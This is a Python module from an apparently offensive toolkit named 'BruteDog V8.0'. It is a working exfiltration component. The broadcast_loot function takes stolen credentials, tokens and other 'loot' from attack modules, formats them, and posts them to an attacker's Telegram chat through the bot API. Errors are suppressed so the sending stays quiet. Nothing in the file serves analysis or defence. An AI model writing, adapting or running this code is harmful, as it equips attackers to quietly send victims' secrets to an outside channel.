import os
import asyncio
import httpx
from typing import Union, Dict, Any

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", os.getenv("BRUTEDOG_TG_TOKEN", ""))
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", os.getenv("BRUTEDOG_TG_CHAT", ""))

async def broadcast_loot(vector: str, details: Union[Dict[str, Any], str]):
    """
    Centralized asynchronous dispatcher for BruteDog offensive modules.
    Formats and pushes credentials, tokens, and cognitive loot straight to Telegram.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    if isinstance(details, dict):
        lines = [f"• <b>{str(k)}</b>: <code>{str(v)}</code>" for k, v in details.items()]
        details_str = "\n".join(lines)
    else:
        details_str = f"<code>{str(details)}</code>"

    message = (
        f"🚨 <b>BRUTEDOG V8.0 — COGNITIVE LOOT INTERCEPT</b> 🚨\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Vector:</b> <code>{vector.upper()}</code>\n\n"
        f"{details_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }

    try:
        async with httpx.AsyncClient(timeout=6.0) as client:
            await client.post(api_url, json=payload)
    except Exception:
        pass

def broadcast_loot_sync(vector: str, details: Union[Dict[str, Any], str]):
    """Synchronous wrapper for modules running in threading or non-async contexts."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(broadcast_loot(vector, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_loot(vector, details))
        except Exception:
            pass
